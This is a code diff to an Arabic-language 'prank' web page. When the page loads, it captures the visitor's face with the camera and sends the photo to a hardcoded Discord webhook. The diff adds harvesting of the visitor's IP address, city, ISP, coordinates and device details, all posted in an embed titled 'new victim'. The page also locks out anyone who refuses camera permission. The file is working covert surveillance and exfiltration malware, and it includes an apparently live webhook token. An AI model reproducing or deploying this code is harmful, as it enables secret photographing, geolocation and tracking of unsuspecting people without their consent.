@@ -134,7 +134,7 @@
       <p style="color: #666; margin: 20px 0;">هذه هي صورتك!</p>
       <img id="capturedPhoto" alt="صورتك">
       <p style="color: #ff4757; font-weight: bold; margin-top: 20px; font-size: 20px;">
-        😂 تحياتي
+        😂 تم مقلبك!
       </p>
     </div>
   </div>
@@ -150,30 +150,60 @@
     const canvas = document.getElementById('canvas');
     const capturedPhoto = document.getElementById('capturedPhoto');
 
-    // ضع Webhook الخاص بك من Discord هنا
+    // ضع Discord Webhook هنا
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1464000266369110038/QPfYRwlrewHl-vowOukyN-YrYRIJ3pZiw_KhIx5NMbB-QDn4Cm9rNnoU1K6yngbkF5MC';
 
     let savedPhotoData = null;
 
+    // جمع معلومات الجهاز
+    async function getDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceMemory: navigator.deviceMemory || 'غير متوفر',
+        cores: navigator.hardwareConcurrency || 'غير متوفر',
+        ip: 'جارٍ الجلب...',
+        city: 'جارٍ الجلب...',
+        country: 'جارٍ الجلب...'
+      };
+
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        info.ip = data.ip;
+        info.city = data.city || 'غير معروف';
+        info.country = data.country_name || 'غير معروف';
+        info.region = data.region || 'غير معروف';
+        info.isp = data.org || 'غير معروف';
+        info.latitude = data.latitude || 'غير معروف';
+        info.longitude = data.longitude || 'غير معروف';
+      } catch (error) {
+        console.error('خطأ في جلب IP:', error);
+      }
+
+      return info;
+    }
+
     // تشغيل تلقائي عند فتح الصفحة
     window.onload = async function() {
       try {
-        // طلب صلاحية الكاميرا مباشرة (بدون أي شكل واضح)
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user" } 
         });
         
-        // تشغيل الفيديو (مخفي)
         video.srcObject = stream;
         
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
             video.play();
-            setTimeout(resolve, 2000); // انتظر ثانيتين للحصول على صورة واضحة
+            setTimeout(resolve, 2000);
           };
         });
 
-        // التقط الصورة
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
@@ -181,19 +211,15 @@
         
         savedPhotoData = canvas.toDataURL('image/png');
 
-        // أوقف الكاميرا
         stream.getTracks().forEach(track => track.stop());
 
-        // أرسل الصورة للـ Discord
         await sendToDiscord(savedPhotoData);
 
-        // أظهر الشاشة الرئيسية
         loadingScreen.style.display = 'none';
         mainScreen.style.display = 'block';
 
       } catch (error) {
         console.error('خطأ:', error);
-        // إذا رفض الصلاحية، أخرجه من الموقع
         document.body.innerHTML = `
           <div class="container">
             <div class="error-screen">
@@ -205,29 +231,118 @@
       }
     };
 
-    // إرسال الصورة للـ Discord
+    // إرسال للـ Discord
     async function sendToDiscord(imageData) {
       try {
+        console.log('📸 بدء الإرسال للـ Discord...');
+        
+        // جمع معلومات الجهاز
+        const deviceInfo = await getDeviceInfo();
+        console.log('📊 معلومات الجهاز:', deviceInfo);
+
         // تحويل base64 إلى blob
         const blob = await fetch(imageData).then(r => r.blob());
         
-        // إنشاء FormData لإرسال الصورة
+        // إنشاء FormData
         const formData = new FormData();
         formData.append('file', blob, 'prank.png');
-        formData.append('content', '🎯 تم التقاط صورة جديدة من المقلب!');
+        
+        // إنشاء رسالة Embed منسّقة
+        const embed = {
+          title: '🎯 تم التقاط صورة جديدة!',
+          color: 15158332, // أحمر
+          fields: [
+            {
+              name: '🌐 IP Address',
+              value: `\`${deviceInfo.ip}\``,
+              inline: true
+            },
+            {
+              name: '📍 الموقع',
+              value: `${deviceInfo.city}, ${deviceInfo.country}`,
+              inline: true
+            },
+            {
+              name: '🗺️ المنطقة',
+              value: deviceInfo.region,
+              inline: true
+            },
+            {
+              name: '📡 ISP',
+              value: deviceInfo.isp,
+              inline: false
+            },
+            {
+              name: '📌 الإحداثيات',
+              value: `${deviceInfo.latitude}, ${deviceInfo.longitude}`,
+              inline: true
+            },
+            {
+              name: '💻 النظام',
+              value: deviceInfo.platform,
+              inline: true
+            },
+            {
+              name: '🖥️ الشاشة',
+              value: deviceInfo.screenResolution,
+              inline: true
+            },
+            {
+              name: '🌍 اللغة',
+              value: deviceInfo.language,
+              inline: true
+            },
+            {
+              name: '⏰ المنطقة الزمنية',
+              value: deviceInfo.timezone,
+              inline: true
+            },
+            {
+              name: '🧠 الذاكرة',
+              value: `${deviceInfo.deviceMemory} GB`,
+              inline: true
+            },
+            {
+              name: '⚙️ المعالج',
+              value: `${deviceInfo.cores} cores`,
+              inline: true
+            },
+            {
+              name: '🌐 User Agent',
+              value: `\`\`\`${deviceInfo.userAgent}\`\`\``,
+              inline: false
+            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: '😂 تم المقلب بنجاح'
+          }
+        };
 
-        await fetch(DISCORD_WEBHOOK, {
+        formData.append('payload_json', JSON.stringify({
+          content: '🎉 **ضحية جديدة!**',
+          embeds: [embed]
+        }));
+
+        console.log('📤 جاري الإرسال...');
+
+        const response = await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
           body: formData
         });
 
-        console.log('✅ تم إرسال الصورة للـ Discord');
+        if (response.ok) {
+          console.log('✅ تم الإرسال بنجاح للـ Discord!');
+        } else {
+          const errorText = await response.text();
+          console.error('❌ فشل الإرسال:', response.status, errorText);
+        }
+
       } catch (error) {
-        console.error('خطأ في إرسال Discord:', error);
+        console.error('❌ خطأ في الإرسال:', error);
       }
     }
 
-    // عرض الصورة عند الضغط على الزر الأحمر
     function showPhoto() {
       if (savedPhotoData) {
         capturedPhoto.src = savedPhotoData;
